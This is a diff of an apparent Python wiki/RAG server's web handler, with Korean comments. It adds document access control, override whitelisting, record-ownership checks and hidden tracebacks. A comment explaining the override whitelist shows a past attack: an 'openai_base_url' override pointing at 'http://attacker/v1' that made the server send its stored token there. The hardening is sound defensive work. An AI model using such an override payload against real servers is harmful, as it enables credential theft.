@@ -10,6 +10,7 @@ from __future__ import annotations
 
 import json
 import os
+import re
 import threading
 import time
 import traceback
@@ -36,18 +37,22 @@ def _ops_catalog() -> List[Dict[str, str]]:
     """보안 탭 '개별 작업 오버라이드' 편집을 돕는 대표 op 목록 (감사 로그의 op 이름과 동일)."""
     rows: List[Dict[str, str]] = []
     samples = [("POST", "/api/query", {}), ("POST", "/api/search", {}), ("POST", "/api/feedback", {}), ("POST", "/api/forensic/expect", {}),
+               ("POST", "/api/query/rerun", {}), ("POST", "/api/sweep", {"action": "run"}),
                ("POST", "/api/eval", {}), ("POST", "/api/trials", {"action": "run"}), ("POST", "/api/fusion/compare", {}), ("POST", "/api/models/test", {}),
                ("POST", "/api/evolve/review", {}), ("POST", "/api/mcp_sources", {"action": "test"}),
                ("POST", "/api/pins", {"action": "add"}), ("POST", "/api/query_rules", {"action": "save"}), ("POST", "/api/prompts", {}), ("POST", "/api/tuning", {"action": "set"}),
                ("POST", "/api/presets", {"action": "save"}), ("POST", "/api/wiki/page", {}), ("POST", "/api/evolve/apply", {}), ("POST", "/api/evolve/reject", {}),
-               ("POST", "/api/memory", {"action": "decay"}), ("POST", "/api/rules", {}), ("POST", "/api/trials", {"action": "delete"}),
+               ("POST", "/api/memory", {"action": "decay"}), ("POST", "/api/rules", {}), ("POST", "/api/graph_rules", {"action": "add_entity"}),
+               ("POST", "/api/trials", {"action": "delete"}),
                ("POST", "/api/build", {"full": False}), ("POST", "/api/build/verify", {"fix": True}), ("POST", "/api/precompute", {"action": "run"}),
                ("POST", "/api/maintenance", {"action": "vacuum"}), ("POST", "/api/snapshot", {"action": "create"}), ("POST", "/api/watch", {"action": "start"}),
                ("POST", "/api/mcp_sources", {"action": "ingest"}),
                ("POST", "/api/build", {"full": True}), ("POST", "/api/build", {"channel": "fts"}), ("POST", "/api/snapshot", {"action": "restore"}),
                ("POST", "/api/config", {}), ("POST", "/api/models/set", {}), ("POST", "/api/agents", {}), ("POST", "/api/auth/users", {"action": "add"}),
                ("POST", "/api/security", {"action": "set_permissions"}), ("POST", "/api/apikeys", {"action": "add"}), ("POST", "/api/mcp_sources", {"action": "save"}),
-               ("POST", "/api/build", {"purge_logs": True}), ("POST", "/api/maintenance", {"action": "purge_requests"})]
+               ("POST", "/api/build", {"purge_logs": True}), ("POST", "/api/maintenance", {"action": "purge_requests"}),
+               ("POST", "/api/reset", {"scope": "data"}), ("POST", "/api/reset", {"scope": "settings"}),
+               ("POST", "/api/reset", {"scope": "logs"})]
     seen = set()
     for m, p, b in samples:
         lv, op = classify_api(m, p, b)
@@ -176,9 +181,79 @@ def _as_argv(v: Any) -> List[str]:
     raise BadRequest("argv 는 문자열 또는 배열이어야 합니다 (받은 값: %s)" % type(v).__name__)
 
 
-def _with_overrides(pipe, overrides: Optional[Dict[str, Any]]):
-    """요청 단위 토글/프로바이더 오버라이드 — 스레드 로컬 설정 사본(request_scope) 으로 격리된다 (다른 사용자의 요청에 영향 없음)."""
-    return pipe.request_scope(overrides=overrides or None)
+def _with_overrides(pipe, overrides: Optional[Dict[str, Any]], actor: Optional[Dict[str, str]] = None):
+    """요청 단위 토글/프로바이더 오버라이드 — 스레드 로컬 설정 사본(request_scope) 으로 격리된다 (다른 사용자의 요청에 영향 없음).
+
+    actor 를 주면 그 역할로 **문서 단위 접근 제어**가 걸린다 (llmwiki/docacl.py).
+    주지 않으면 admin 으로 본다 — 내부 호출·CLI 는 제한하지 않는다."""
+    return pipe.request_scope(overrides=overrides or None, actor=actor)
+
+
+def _actor_of(user) -> Dict[str, str]:
+    """로그인 사용자 → docacl 이 쓰는 신분. 익명은 anonymous_role(보통 viewer)로 내려온다."""
+    return {"user": getattr(user, "name", "") or "guest",
+            "role": getattr(user, "role", "") or "viewer",
+            "origin": "web"}
+
+
+def _actor_from_client(client: Optional[Dict[str, Any]]) -> Dict[str, str]:
+    """POST 처리기의 `_client` 딕셔너리 → docacl 신분.
+
+    `_dispatch_post` 에는 User 객체가 없고 인증 단계가 넣어 둔 `_client`({user, role, via, origin…}) 만 있다.
+    역할을 못 읽으면 **가장 낮은 등급(viewer)** 으로 본다 — 모르면 열어 주는 쪽이 아니라 닫는 쪽이다."""
+    c = client or {}
+    return {"user": str(c.get("user") or "guest"),
+            "role": str(c.get("role") or "viewer"),
+            "origin": str(c.get("origin") or "web")}
+
+
+def _doc_denied(p, user, doc_id: str) -> Optional[Dict[str, Any]]:
+    """문서 열람 출구의 공통 관문. 볼 수 있으면 None, 못 보면 그대로 돌려줄 오류 본문.
+
+    검색 경로(`doc_acl` 단계)만 막으면 `/api/doc?id=...` 로 직접 열어 우회할 수 있다.
+    근거가 새는 길은 전부 같은 판정기를 쓴다 (llmwiki/docacl.py 의 표 참고).
+    """
+    from .. import docacl as _acl
+    if not bool(getattr(p.s.toggles, "doc_acl", True)):
+        return None
+    role = getattr(user, "role", "") or "viewer"
+    if role == "admin":
+        return None
+    acl = _acl.load()
+    armed = bool(acl.get("enabled", True)) and bool(acl.get("rules") or _acl._rank(acl.get("default_min_role")) > 0)
+    if not armed:
+        return None           # 규칙이 하나도 없으면 예전과 똑같이 동작한다
+    # 규칙이 켜져 있는데 판정에 실패하면 **막는다** — 메타를 못 읽었다고 비공개 문서를 열어 줄 수는 없다.
+    try:
+        f = _acl.Filter(role, p.store.doc_meta_map(), acl)
+        ok, need = f.doc_ok(str(doc_id or "")), f.blocked_docs.get(str(doc_id or "")) or "?"
+    except Exception as e:
+        ok, need = False, "판정 실패(%s)" % str(e)[:60]
+    if ok:
+        return None
+    return {"error": acl.get("deny_message") or "권한이 없는 문서입니다",
+            "detail": "이 문서는 %s 이상만 볼 수 있습니다 (현재 %s)" % (need, role),
+            "doc_id": doc_id, "min_role": need, "role": role}
+
+
+# ---------------------------------------------------------------- 요청 단위 overrides 화이트리스트 (2026-09-18)
+# 왜 있나: apply_overrides 는 Settings 의 **모든** 필드를 받아들인다. 그래서 예전에는 읽기 등급(익명 포함)이
+# `/api/query` 에 {"overrides": {"openai_base_url": "http://attacker/v1"}} 를 보내면 서버가 .env 의 PAT 를 그 주소로
+# 보냈고, `corpus_dirs` 를 바꿔 임의 폴더를 색인시킬 수도 있었다 (CODE_REVIEW_0917 §0 P0-1).
+# 여기서는 "질의 한 번의 동작을 바꾸는 손잡이" 만 누구나 쓰게 하고, URL·헤더·경로·서버 운영 키는 admin 에게만 허용한다.
+# 목록 조정은 security.json `overrides.allow_extra`(추가 허용) / `overrides.deny`(admin 도 금지) — 코드 수정 없이.
+# 목록과 검사는 **auth 계층**에 있다 (llmwiki/auth.py). Web 만 검사하면 MCP 로 같은 일이 가능했기 때문이다.
+OVERRIDE_SAFE_KEYS = _authmod.OVERRIDE_SAFE_KEYS
+OVERRIDE_ROLE_ATTRS = _authmod.OVERRIDE_ROLE_ATTRS
+
+
+def _filter_overrides(ov: Dict[str, Any], role: str, path: str = "") -> Dict[str, Any]:
+    """요청 단위 overrides 에서 이 역할이 쓸 수 없는 키를 거른다 (`auth.filter_overrides` 로 위임)."""
+    try:
+        cfg = Handler.auth.cfg if Handler.auth is not None else {}
+    except Exception:
+        cfg = {}
+    return _authmod.filter_overrides(ov, role, cfg)
 
 
 def _cli_equiv(cmd: str, q: str, overrides: Dict[str, Any], base_toggles: Toggles) -> str:
@@ -197,6 +272,10 @@ def _cli_equiv(cmd: str, q: str, overrides: Dict[str, Any], base_toggles: Toggle
             parts.append("--k %s" % v)
         elif k == "debug_level":
             parts.append("--debug %s" % v)
+        elif k == "output_mode":
+            parts.append("--output %s" % v)
+        elif k == "tuning" and isinstance(v, dict) and v:
+            parts.append("--tuning " + ",".join("%s=%s" % (a, b) for a, b in v.items()))
         elif k.rsplit("_", 1)[0] in Settings.LLM_ROLES and k.endswith(("_model", "_provider")):
             parts.append("--%s %s" % (k.replace("_", "-"), v))
     return " ".join(parts) + " --trace"
@@ -284,6 +363,19 @@ class Handler(BaseHTTPRequestHandler):
             origin = "api"
         return {"user": user.name if user else "guest", "role": user.role if user else "", "via": user.via if user else "anon",
                 "ip": self._ip(), "origin": origin, "agent": (self.headers.get("User-Agent") or "")[:100]}
+
+    def _can_see_users(self, user: Optional[User]) -> bool:
+        """남의 사용자 id·IP·에이전트를 볼 수 있나.
+
+        admin 은 항상 본다. 그 외에는 `server.json` 의 `monitor.show_user_to_viewer` 를 따른다 —
+        진행 중 작업 목록(`/api/activity`)과 같은 규칙이라 한 화면에서 정책이 엇갈리지 않는다.
+        """
+        if user and getattr(user, "role", "") == "admin":
+            return True
+        try:
+            return bool((_mgr().cfg.get("monitor") or {}).get("show_user_to_viewer", True))
+        except Exception:
+            return True
 
     def _job_cancellable(self, tok: str, user: Optional[User]) -> bool:
         """막 시작해 아직 티켓이 없는 잡이면 취소를 예약할 수 있게 한다 (요청 → 스레드 기동 사이의 경쟁 상태)."""
@@ -400,6 +492,22 @@ class Handler(BaseHTTPRequestHandler):
     # ---------------- MCP (Streamable HTTP) ----------------
     mcp_only = False   # serve(mcp_only=True): /mcp 와 /api/auth/me 만 제공
 
+    def _not_my_request(self, rec: Optional[Dict[str, Any]], user, auth) -> bool:
+        """이 요청 기록이 **남의 것**인가 (전체 조회 권한도 없고).
+
+        `request_id` 는 순차 정수라 남의 번호를 추측이 아니라 **열거**할 수 있다. 그래서 지난 질의의 원문·
+        답변·중간 결과를 꺼내는 길은 전부 이 검사를 지나야 한다: `/api/request` · `/api/rerun` ·
+        `/api/query/rerun` · `/api/query_trace` · `/api/analysis`. 하나만 빼놓으면 나머지가 무의미해진다.
+        """
+        if not rec or not rec.get("user") or not user or not auth or auth.mode == "off":
+            return False
+        if rec["user"] == user.name:
+            return False
+        try:
+            return not auth.allowed(user.role, "run", "requests all")
+        except Exception:
+            return True        # 판정에 실패하면 막는다 (남의 기록을 열어 주는 쪽으로 기울지 않는다)
+
     def _mcp(self, method: str) -> None:
         """POST/GET/DELETE /mcp — 인증(Bearer API 키·쿠키·익명) 과 read 등급 권한은 authorize() 로, 본문은 mcp.handle_http 로."""
         from .. import mcp as _mcp
@@ -442,7 +550,9 @@ class Handler(BaseHTTPRequestHandler):
         mgr = _mgr()
         try:
             with mgr.ticket("mcp", "read" if heavy else "none", client=self._client(user, "mcp"), label=label):
-                with self.pipe.request_scope():
+                # actor 를 넘겨야 MCP 도 Web 과 **같은 문서 접근 제어**를 받는다 (llmwiki/docacl.py).
+                # 넘기지 않으면 pipe.actor 기본값이 admin 이라 API 키 하나로 전 문서가 열린다.
+                with self.pipe.request_scope(actor=dict(_actor_of(user), origin="mcp")):
                     status, hdrs, out = _mcp.handle_http(self.pipe, method, body, self.headers)
         except _rq.Rejected as e:
             data = json.dumps({"jsonrpc": "2.0", "id": None, "error": {"code": -32002, "message": e.message, "status": e.status, "data": e.body()}}).encode("utf-8")
@@ -509,7 +619,33 @@ class Handler(BaseHTTPRequestHandler):
         except (BadRequest, TypeError, AttributeError, ValueError, KeyError, OverflowError) as e:
             self._bad_request(u.path, e)
         except Exception as e:
-            self._json({"error": str(e), "trace": traceback.format_exc()}, 500)
+            self._server_error(u.path, e)
+
+    def _server_error(self, path: str, e: BaseException) -> None:
+        """서버 결함(500). 트레이스는 **로그(error.log)에** 남기고 클라이언트에는 참조 id 만 준다.
+        예전에는 모든 사용자에게 스택트레이스(파일 경로·코드)를 돌려주면서 정작 서버 로그에는 남기지 않아
+        운영자가 500 을 볼 방법이 없었다 (CODE_REVIEW_0917 §2.3 S2). admin 이거나 server.json debug.expose_trace=true 면 트레이스를 포함한다."""
+        from .. import logging_setup as _ls
+        ref = uuid.uuid4().hex[:8]
+        tb = traceback.format_exc()
+        try:
+            _ls.log("error", "server error %s [%s]: %s: %s" % (path, ref, type(e).__name__, e), "web", path=path, ref=ref,
+                    exc=type(e).__name__, trace=tb[-4000:])
+        except Exception:
+            pass
+        out: Dict[str, Any] = {"error": "%s: %s" % (type(e).__name__, str(e)[:300]), "code": "internal", "ref": ref,
+                               "hint": "logs grep --text %s (error.log)" % ref}
+        expose = False
+        try:
+            expose = bool(((_mgr().cfg.get("debug") or {}).get("expose_trace")))
+            if not expose:
+                u = self._user()
+                expose = bool(u and u.role == "admin")
+        except Exception:
+            pass
+        if expose:
+            out["trace"] = tb
+        self._json(out, 500)
 
     # GET 중 무거운 것(분석 리포트·health ping·verify·system 통계)은 읽기 슬롯을 받는다; 나머지 조회는 등록도 하지 않는다 (폴링 비용 0)
     HEAVY_GET = ("/api/analysis", "/api/optimize/bundle", "/api/health", "/api/build/verify", "/api/system", "/api/graph", "/api/embed/report", "/api/corpus/lint", "/api/forensic")
@@ -570,6 +706,13 @@ class Handler(BaseHTTPRequestHandler):
             if u.path == "/api/schedule":
                 from .. import scheduler as _sc
                 sch = _SCHED.get("scheduler")
+                if sch is not None:
+                    # 실행 중인 스케줄러는 tick_s(기본 5초) 마다 파일 mtime 을 본다. 조회할 때도 한 번 보게 해서
+                    # "파일을 고치고 새로고침했는데 예전 목록이 나온다" 를 없앤다 (getmtime 1회 — 폴링 비용은 그대로).
+                    try:
+                        sch._maybe_reload()
+                    except Exception:
+                        pass
                 return self._json({"tasks": (sch.list_tasks() if sch else _sc.list_tasks_static()), "path": _sc.schedule_path(), "running": bool(sch),
                                    "history": (sch.history(_qint(qs, "n", 50)) if sch else _sc.read_history(_qint(qs, "n", 50))),
                                    "action_types": _sc.ACTION_TYPES, "help": _sc.HELP})
@@ -597,10 +740,33 @@ class Handler(BaseHTTPRequestHandler):
                 return self._json({"security": cfg, "path": __import__("llmwiki.auth", fromlist=["security_path"]).security_path(), "effective_mode": auth.mode,
                                    "permissions": auth.permissions(), "defaults": DEFAULT_LEVEL_ROLE, "levels": list(LEVELS), "level_labels": LEVEL_LABEL,
                                    "roles": list(ROLES), "role_labels": ROLE_LABEL, "ops_catalog": _ops_catalog()})
+            if u.path == "/api/docacl":
+                # 문서 단위 접근 제어 (CLI `security docacl show` 와 같은 내용 + 토글 상태)
+                from .. import docacl as _dacl
+                return self._json(dict(_dacl.describe(), toggle=bool(getattr(p.s.toggles, "doc_acl", True)),
+                                       example="setup/docacl.example.json", role_labels=ROLE_LABEL))
+            if u.path == "/api/sweep/keys":
+                # Pipeline 페이지의 스윕 폼: 스윕할 수 있는 키(type/min/max/choices/stage/point) + 재시작점 표 + 상한
+                from .. import sweep as _sw, rerun as _rr
+                return self._json({"keys": _sw.sweepable_keys(p.s), "points": _rr.POINTS, "stages": _sw.STAGES,
+                                   "max_values": int(getattr(p.s, "sweep_max_values", 20) or 20), "max_repeats": _sw.MAX_REPEATS,
+                                   "saved": _rr.list_saved(p.s, _qint(qs, "n", 20))})
+            if u.path == "/api/sweep":
+                # ?id=<sw id> → 기록 + 비교 · 없으면 목록
+                from .. import sweep as _sw
+                sid = qs.get("id") or ""
+                if sid:
+                    rec = _sw.load(p.s, sid)
+                    if not rec:
+                        return self._json({"error": "sweep not found: %s" % sid}, 404)
+                    return self._json({"record": rec, "compare": _sw.compare(rec), "text": _sw.render_text(rec)})
+                return self._json({"sweeps": _sw.list_sweeps(p.s, _qint(qs, "n", 50))})
             if u.path == "/api/rerun":
                 # 화면이 trace 의 각 줄에 ⟲ 를 달 수 있게: 재시작점 표 + 이 요청에 저장된 중간 결과가 있는지
                 from .. import rerun as _rr
                 rid = qs.get("request_id") or ""
+                if rid and self._not_my_request(p.store.get_request(_qint(qs, "request_id", 0), archive_dir=p.s.requests_archive_dir()), user, auth):
+                    return self._json({"error": "다른 사용자의 요청입니다 (전체 조회 권한 필요: 작업 'requests all')"}, 403)
                 data = _rr.load(p.s, rid) if rid else None
                 ok, why = _rr.check_compatible(data or {}, str(p.store.build_version())) if rid else (False, "request_id 가 없습니다")
                 return self._json({"points": _rr.POINTS, "stage_point": _rr.STAGE_POINT,
@@ -635,26 +801,105 @@ class Handler(BaseHTTPRequestHandler):
             with (mgr.ticket("read", "read", client=self._client(user), label="GET " + u.path) if heavy else _noop()):
                 if u.path == "/api/status":
                     st = self._status()
+                    from .. import __version__ as _pkg_ver
+                    st["version"] = _pkg_ver                     # = `--version` · MCP serverInfo.version · docs/RELEASE_NOTES.md 최신 절
                     st["auth"] = dict(auth.public_info(), user=user.to_dict() if user else None)
+                    try:   # 로그 총량 요약 (log_check_interval_s 가 지났을 때만 다시 잰다) — 헤더 배너용
+                        from .. import logging_setup as _ls
+                        q = _ls.check_quota(force=False, dir_hint=path_for("logs_dir"))
+                        st["log_quota"] = {k: q.get(k) for k in ("over", "stopped", "total_mb", "limit_mb", "pct", "action", "enabled")}
+                    except Exception:
+                        st["log_quota"] = None
                     return self._json(st)
+                if u.path == "/api/opstats":
+                    # 운영 통계 (읽기 전용) — CLI `stats --full` · MCP wiki_status(full=true) 와 같은 함수.
+                    # 집계가 DB 를 훑으므로 기간·상한을 둔다 (큰 DB 에서 화면이 멈추지 않게).
+                    from .. import opstats as _ops
+                    secs = [x for x in (qs.get("sections") or "").split(",") if x.strip()]
+                    d_ = _ops.collect(p, days=float(qs.get("days") or 7),
+                                      sections=secs or None, top=_qint(qs, "top", 8),
+                                      bucket=(qs.get("bucket") or "day"),
+                                      trend_days=(float(qs["trend_days"]) if qs.get("trend_days") else None))
+                    # `users` 절은 **누가 얼마나 썼나** 다 — `/api/query_users` 와 같은 민감도이므로 같은 잣대(admin)를
+                    # 쓴다. 이 경로 자체는 read 등급이라, 여기서 걸러 내지 않으면 viewer 가 우회로로 같은 값을 본다
+                    # (2026-09-20 정렬 감사에서 발견).
+                    return self._json(_ops.redact(d_, admin=bool(user and user.role == "admin")))
                 if u.path == "/api/graph":
                     lim = _qint(qs, "limit", 150)
                     comm = qs.get("community")
                     return self._json(p.graph_export(limit=lim, community=int(comm) if comm not in (None, "", "all") else None))
+                if u.path == "/api/graph/profile":            # 그래프 진단 (§2.5) — 큰 그래프에서는 몇 초 걸린다 (HEAVY_GET 의 /api/graph 접두로 읽기 슬롯)
+                    from .. import graph_profile as _gp
+                    prof = _gp.profile(p, include_eval=qs.get("eval") in ("1", "true"))
+                    path = _gp.save(prof)
+                    out = dict(prof, saved=path)
+                    if qs.get("compare") in ("1", "true"):
+                        hist = _gp.history(p.s)
+                        prev = _gp.load(hist[1]["path"]) if len(hist) > 1 else None
+                        out["compare"] = _gp.compare(prev, prof) if prev else None
+                    return self._json(out)
+                if u.path == "/api/graph/profile/history":
+                    from .. import graph_profile as _gp
+                    return self._json({"history": _gp.history(p.s), "dir": _gp.profiles_dir(p.s), "keep": int(getattr(p.s, "graph_profile_keep", 30) or 30)})
                 if u.path == "/api/entity":
-                    return self._json(p.entity_detail(qs.get("id", "")))
+                    # id 또는 **이름**으로 연다 (2026-09-20). 질의 결과의 그래프 관계 표는 이름(`CL-55303`)만
+                    # 들고 있어서, 화면이 id 규칙(`e:cl-55303`)을 스스로 만들어 내야 했다 — 규칙을 두 곳에 두지 않는다.
+                    ent_id = qs.get("id", "")
+                    if not ent_id and qs.get("name"):
+                        from ..graph_rules import entity_id_for
+                        nm = qs.get("name", "")
+                        ent_id = entity_id_for(nm)
+                        if not p.store.get_entity(ent_id):        # 표기가 조금 달라도 찾아 준다
+                            hits = p.store.entity_fts('"%s"' % nm.replace('"', ""), 1)
+                            if hits:
+                                ent_id = hits[0][0]
+                    d = p.entity_detail(ent_id)
+                    return self._json(d or {"error": "엔티티를 찾지 못했습니다: %s" % (qs.get("name") or ent_id)},
+                                      200 if d else 404)
                 if u.path == "/api/docs":
                     meta = p.store.doc_meta_map()
                     return self._json([dict(d, **{k: (meta.get(d["doc_id"]) or {}).get(k) for k in ("doc_type", "ext_id", "date", "inferred")}) for d in p.store.list_docs()])
                 if u.path == "/api/chunk":
-                    c = p.store.get_chunk(qs.get("id", ""))
+                    cid = qs.get("id", "")
+                    c = p.store.get_chunk(cid)
+                    den = _doc_denied(p, user, (dict(c).get("doc_id") if c else "") or str(cid).rsplit("#", 1)[0])
+                    if den:
+                        return self._json(den, 403)
                     return self._json(dict(c) if c else {"error": "not found"})
+                if u.path == "/api/doc":
+                    # 문서 한 건의 전체 모습 (메타·청크·관계·엔티티). MCP wiki_doc 와 같은 함수.
+                    from .. import querydebug as _qd
+                    d = _qd.doc_detail(p, qs.get("id", ""), _qint(qs, "max_chars", 20000),
+                                       role=(getattr(user, "role", "") or "viewer"))
+                    return self._json(d, 403 if d.get("denied") else 200)
                 if u.path == "/api/doc_chunks":
+                    den = _doc_denied(p, user, qs.get("id", ""))
+                    if den:
+                        return self._json(den, 403)
                     return self._json([dict(c) for c in p.store.all_chunks(qs.get("id", ""))])
                 if u.path == "/api/queries":
-                    return self._json(p.store.queries(_qint(qs, "limit", 50)))
+                    # 누가 무엇을 물었나. user/q/origin 으로 거른다. show_user_to_viewer=false 면 admin 외에는 사용자 id 를 가린다.
+                    rows = p.store.queries(_qint(qs, "limit", 50), user=qs.get("user") or None,
+                                           q=qs.get("q") or None, origin=qs.get("origin") or None)
+                    is_admin = bool(user and user.role == "admin")
+                    see_user = self._can_see_users(user)
+                    me = user.name if user else ""
+                    for r in rows:
+                        if not see_user and (r.get("user") or "") != me:
+                            r["user"] = "(비공개)" if r.get("user") else ""
+                        if not is_admin:          # IP·에이전트는 activity 와 같은 규칙으로 admin 만
+                            r["ip"] = r["agent"] = ""
+                    return self._json({"rows": rows, "me": me, "admin": is_admin, "show_user": see_user})
+                if u.path == "/api/query_users":
+                    # 사용자별 질의 집계는 항상 admin 전용 — '누가 얼마나 썼나' 는 활동 목록보다 민감하다.
+                    if not (user and user.role == "admin"):
+                        return self._json({"error": "admin 전용", "detail": "사용자별 질의 집계는 admin 만 볼 수 있습니다"}, 403)
+                    return self._json(p.store.query_users(_qint(qs, "limit", 50)))
                 if u.path == "/api/query_trace":
                     r = p.store.get_query(_qint(qs, "id", 0))
+                    # 질의 로그의 trace 에는 그때의 근거 청크와 컨텍스트 요약이 들어 있다 — 남의 것이면 막는다.
+                    if self._not_my_request(r, user, auth):
+                        return self._json({"error": "다른 사용자의 질의입니다 (전체 조회 권한 필요: 작업 'requests all')"}, 403)
                     return self._json(json.loads(r["trace"]) if r else {})
                 if u.path == "/api/requests":
                     # scope=mine(기본) | all. 남의 요청까지 보려면 'run' 등급 이상 (security.json permissions 로 조정).
@@ -682,8 +927,7 @@ class Handler(BaseHTTPRequestHandler):
                                        "me": me, "can_all": can_all})
                 if u.path == "/api/request":
                     r = p.store.get_request(_qint(qs, "id", 0), archive_dir=p.s.requests_archive_dir())
-                    if (r and r.get("user") and user and auth and auth.mode != "off" and r["user"] != user.name
-                            and not auth.allowed(user.role, "run", "requests all")):
+                    if self._not_my_request(r, user, auth):
                         return self._json({"error": "다른 사용자의 요청입니다 (전체 조회 권한 필요: 작업 'requests all')"}, 403)
                     if r and qs.get("brief"):
                         # brief=1: **단계별 trace 를 빼고** 답변 요약만. 진행 중 작업 목록에서 한 줄을 눌렀을 때처럼
@@ -696,6 +940,8 @@ class Handler(BaseHTTPRequestHandler):
                 if u.path == "/api/analysis":
                     from .. import analysis as _an
                     rid = _qint(qs, "request_id", 0) or None
+                    if rid and self._not_my_request(p.store.get_request(rid, archive_dir=p.s.requests_archive_dir()), user, auth):
+                        return self._json({"error": "다른 사용자의 요청입니다 (전체 조회 권한 필요: 작업 'requests all')"}, 403)
                     focus = qs.get("focus") or None
                     r = _an.analyze(p, rid, focus=None if focus in (None, "", "all") else focus)
                     if r.get("error"):
@@ -745,9 +991,26 @@ class Handler(BaseHTTPRequestHandler):
                     return
                 if u.path == "/api/models":
                     from .. import models_catalog as _mc
-                    return self._json({"providers": p.provider_status(), "settings": p.base_settings.to_dict(), "roles": list(Settings.LLM_ROLES),
-                                       "role_attrs": list(Settings.LLM_ROLE_ATTRS), "policy": p.base_settings.role_policy_table(),
-                                       "catalog_models": _mc.describe(p.base_settings)})
+                    bs = p.base_settings
+                    # 앙상블(역할 단위 다중 LLM): 화면이 **유효값**(기본값이 합쳐지고 빈 멤버가 걸러진 것)과
+                    # 파일 원본을 함께 봐야 "비워 두면 무엇이 상속되는지" 를 보여 줄 수 있다 — CLI `models ensemble show` 와 같은 값.
+                    ens = {}
+                    for role in Settings.LLM_ROLES:
+                        try:
+                            # role: 멤버가 provider/model 을 비웠을 때 상속되는 **역할 모델**.
+                            # 화면이 "비우면 무엇이 되는지" 를 글로 보여 주고 멤버를 켤 때 자동으로 채우는 데 쓴다.
+                            _rl = bs.role_llm(role)
+                            ens[role] = {"effective": bs.effective_ensemble(role),
+                                         "raw": dict(((bs.llm_roles or {}).get(role) or {}).get("ensemble") or {}),
+                                         "role": {"provider": _rl.get("provider", ""), "model": _rl.get("model", "")}}
+                        except Exception as e:
+                            ens[role] = {"error": str(e)[:200]}
+                    return self._json({"providers": p.provider_status(), "settings": bs.to_dict(), "roles": list(Settings.LLM_ROLES),
+                                       "role_attrs": list(Settings.LLM_ROLE_ATTRS), "policy": bs.role_policy_table(),
+                                       "ensemble": ens,
+                                       "ensemble_defaults": dict(Settings.ENSEMBLE_DEFAULTS, **(bs.llm_ensemble_defaults or {})),
+                                       "ensemble_max_members": Settings.ENSEMBLE_MAX_MEMBERS,
+                                       "catalog_models": _mc.describe(bs)})
                 if u.path == "/api/system":
                     return self._json(p.system_info(_qint(qs, "target_docs", 3000), _qint(qs, "daily_new", 20), _qint(qs, "horizon_days", 365)))
                 if u.path == "/api/watch":
@@ -755,6 +1018,10 @@ class Handler(BaseHTTPRequestHandler):
                 if u.path == "/api/tuning":
                     return self._json({"tunables": _tuning.T.describe(p.s), "stages": _tuning.STAGES, "path": _tuning.TUNING_PATH,
                                        "overrides": _tuning.T.to_dict()})
+                if u.path == "/api/limits":
+                    # 단계별 시간 제한만 따로 (trace 렌더가 매번 /api/architecture 전체를 받지 않도록).
+                    from ..architecture import stage_limits as _stage_limits
+                    return self._json(_stage_limits(p.s, _mgr().cfg or {}))
                 if u.path == "/api/architecture":
                     reg = _arch_registry()
                     last = {}
@@ -764,12 +1031,32 @@ class Handler(BaseHTTPRequestHandler):
                             r = p.store.get_request(rows[0]["id"])
                             if r and r.get("trace"):
                                 last[kind] = {"id": r["id"], "summary": r["summary"], "ms": r["ms"], "trace": r["trace"]}
+                    # limits: 단계별 시간 제한 (실측 ms 옆 괄호와 🧭 Pipeline 단계 카드가 같은 값을 쓴다)
+                    from ..architecture import stage_limits as _stage_limits
+                    lim = _stage_limits(p.s, _mgr().cfg or {})
                     return self._json(dict(reg, toggles=p.s.toggles.__dict__, settings=p.s.to_dict(), tuning=_tuning.T.to_dict(), last=last,
+                                           limits=lim,
                                            providers={k: v for k, v in p.provider_status().items() if k != "catalog"}))
                 if u.path == "/api/evolve/status":
                     return self._json(ev.status(p))
                 if u.path == "/api/evolve/proposals":
-                    return self._json(p.store.proposals(qs.get("status") or None))
+                    rows = p.store.proposals(qs.get("status") or None)
+                    # 목록에도 설명을 붙인다 (payload JSON 원문만 보여 주던 문제 — 2026-09-19).
+                    # 규칙 사전은 describe_proposals 안에서 한 번만 읽는다.
+                    try:
+                        for r_, d_ in zip(rows, ev.describe_proposals(p, rows)):
+                            r_["explain"] = d_
+                    except Exception:
+                        pass
+                    return self._json(rows)
+                if u.path == "/api/evolve/describe":
+                    # 제안 한 건의 사람용 설명 — CLI `evolve show <id>` · MCP wiki_evolve(explain) 와 같은 내용
+                    try:
+                        pid_ = int(qs.get("id") or 0)
+                    except ValueError:
+                        return self._json({"error": "id 가 정수가 아닙니다"}, 400)
+                    d_ = ev.describe_proposal(p, pid_)
+                    return self._json(d_, 404 if d_.get("error") else 200)
                 if u.path == "/api/wiki/list":
                     d = p.s.wiki_dir
                     files = sorted(f for f in os.listdir(d)) if os.path.isdir(d) else []
@@ -782,6 +1069,50 @@ class Handler(BaseHTTPRequestHandler):
                         return self._json({"name": qs.get("name"), "content": f.read()})
                 if u.path == "/api/eval/questions":
                     return self._json(load_questions())
+                if u.path == "/api/reset":
+                    # 관리자 초기화 **미리보기** (GET 은 아무것도 바꾸지 않는다). 실행은 POST.
+                    from .. import reset as _rs
+                    sc = (qs.get("scope") or "").strip()
+                    if not sc:
+                        return self._json({"scopes": _rs.SCOPES})
+                    o = {k: (qs.get(k) or "").lower() in ("1", "true", "on", "yes")
+                         for k in ("clear_embed_cache", "include_security", "include_env",
+                                   "include_proposals", "include_sessions", "purge_wiki_notes")}
+                    pl = _rs.preview(p, sc, snapshot=(qs.get("snapshot") or "1").lower() not in ("0", "false", "off"),
+                                     keep_wiki_notes=not o["purge_wiki_notes"],
+                                     clear_embed_cache=o["clear_embed_cache"], include_security=o["include_security"],
+                                     include_env=o["include_env"], include_proposals=o["include_proposals"],
+                                     include_sessions=o["include_sessions"])
+                    return self._json(pl, 400 if pl.get("error") else 200)
+                if u.path == "/api/graph_rules":
+                    # 그래프 빌드 규칙의 **구조화된 보기** — 원문 JSON(/api/rules) 과 달리 화면이 바로 쓸 수 있는 모양.
+                    # CLI `graph-rules types|lint|test` · MCP wiki_graph_rules 와 같은 내용 (2026-09-19).
+                    from .. import graph_rules as _gr
+                    gr_rules = _gr.load_rules()
+                    gr_types = _gr.known_types(gr_rules)
+                    gr_schema = _gr.Schema(gr_rules.get("schema"), gr_types)
+                    act = (qs.get("action") or "summary").strip()
+                    if act == "lint":
+                        return self._json(_gr.lint(gr_rules))
+                    if act == "test":
+                        ex = _gr.RuleExtractor(gr_rules)
+                        dm = {"doc_type": qs.get("doc_type") or "", "ext_id": qs.get("ext_id") or ""}
+                        ents, cnts, rels = ex.extract_chunk(qs.get("q") or "", "", "test", "테스트 문서",
+                                                            dm if (dm["doc_type"] or dm["ext_id"]) else None)
+                        return self._json({
+                            "entities": [{"name": e.name, "type": e.type, "mentions": cnts.get(k, 0)} for k, e in ents.items()],
